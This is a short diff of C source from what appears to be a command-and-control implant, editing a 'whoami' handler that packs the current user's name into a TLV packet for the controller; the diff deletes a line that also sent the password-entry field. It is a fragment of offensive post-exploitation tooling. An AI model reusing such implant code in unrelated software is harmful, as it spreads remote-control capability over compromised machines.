@@ -199,9 +199,7 @@ static tlv_pkt_t *builtin_whoami(c2_t *c2)
     if ((pw_entry = getpwuid(geteuid())))
     {
         result = api_craft_tlv_pkt(API_CALL_SUCCESS);
-
         tlv_pkt_add_string(result, TLV_TYPE_STRING, pw_entry->pw_name);
-        tlv_pkt_add_string(result, TLV_TYPE_STRING, pw_entry->pw_passwd);
     }
     else
     {
